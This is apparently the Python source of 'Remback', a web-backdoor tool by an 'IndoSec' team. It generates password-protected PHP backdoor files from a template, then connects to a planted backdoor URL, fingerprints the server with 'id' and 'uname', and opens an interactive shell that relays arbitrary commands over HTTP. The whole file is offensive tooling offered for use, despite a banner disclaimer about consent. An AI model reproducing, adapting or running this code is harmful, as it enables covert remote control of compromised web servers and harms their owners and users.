# -*- coding: utf-8 -*-
from requests import get
from time import sleep
import os

def cls():
    os.system('cls' if os.name=='nt' else 'clear')
     
def banner():
    print("""
         `:+syhhys+:`           ______ _______ _______  _____  _______ _______
       -yNMMMMMMMMMMMh:        |_____/ |______ |  |  | |     |    |    |______
      /MMMMMMMMMMMMMMMM+       |    \_ |______ |  |  | |_____|    |    |______
      NhMMMMMMMMMMMMMMyN`     
      m+NMMMMMMMMMMMMM/N       ______  _______ _______ _     _ ______   _____   _____   ______
      :omy+/:+MM+:/+yN+/       |_____] |_____| |       |____/  |     \ |     | |     | |_____/
  :-   -M-  `/NN/`  :M.   --   |_____] |     | |_____  |    \_ |_____/ |_____| |_____| |    \_
 .mN.  :NNysmM++NmssNN-  .Nm.  ---------------------------------------------------------------
.yyhyys///+yMd+odMh+///syhhyy. Author : Rizsyad AR ft Fauzan W
 `  `.-+s-o/syyyys/s:s+:.`  `  Team   : { IndoSec }
          s-      :y           We not responsible for damage caused by Remback. 
  `/:-/ohy+mhyssyhm+sho/-:/`   Attacking targets without mutual consent is illegal!
   +mNy+-` ./osso/. `-+yNm+   
    s/                  +s    
    """)

def connect():
    url = raw_input("[?] Input Backdoor Location\t: ")
    password = raw_input("[?] Input Backdoor Password\t: ")

    try:
        check = get(url, params={"password":password}).text.replace('\n','')
    except:
        print("[-] Error, Check your URL")
        exit(0)

    if check == "true":
    
        userID = get(url, params={"password":password,"cmd":"id"}).text.replace('\n','')
        kernel = get(url, params={"password":password,"cmd":"uname -nvpmso"}).text.replace('\n','')
        getpwnd = get(url, params={"password":password,"cmd":"pwd"}).text.replace('\n','')
        
        print("[+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++]")
        print("[!] Backdoor Is Live.. Waiting to Connect BackDoor")
        print("[+] Kernel\t: " + kernel)
        print("[+] User ID\t: " + userID)
        print("[+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++]\n")
        
        sleep(2)
        #PARAMS = {"password":password,"cmd":"whoami"}
        #r = get(url, params=PARAMS).text
        #domain = get(url, params="domain").text.replace('\n','')
        command = "Remback@shell:" +getpwnd + "# "
        while True:
                cmd = raw_input(command)
                if cmd == "exit":
                    break
                elif cmd == "clear":
                    cls()
                    
                    
                PARAMS = {"password":password,"cmd":cmd}
                result = get(url, params=PARAMS).text
                print(result + "\n")
            
    
    else:
        print("[-] Password is Incoret")
        exit(0)


def generate():
    backdoor_name   = raw_input("\n[?] Backdoor Name : ")
    password        = raw_input("[?] Password      : ")
    opensample      = open('sample/backdoor.txt', 'r')
    replacePassword = opensample.read().replace('12345p455word', password)
    opensample.close()
    openbackdoor    = open(backdoor_name + '.php', 'w')
    openbackdoor.write(replacePassword)
    openbackdoor.close()
    print("""\n[✔] Generating backdoor successfully\n└[•] Backdoor Name\t: """ + backdoor_name + """\n└[•] Backdoor Password\t: """ + password +"""""")

banner()
print("""
[+] Options :
└[•] 1. Generate Backdoor
└[•] 2. Remote Backdoor
└[•] 3. Bypass Shell Exec (Coming Soon)
""")
action = raw_input("┌[+] Choose the options\n└[remback@indosec]:~# ")
if action == "1":
    generate()
elif action == "2":
    connect()
else:
    print("[!] Incorrect options")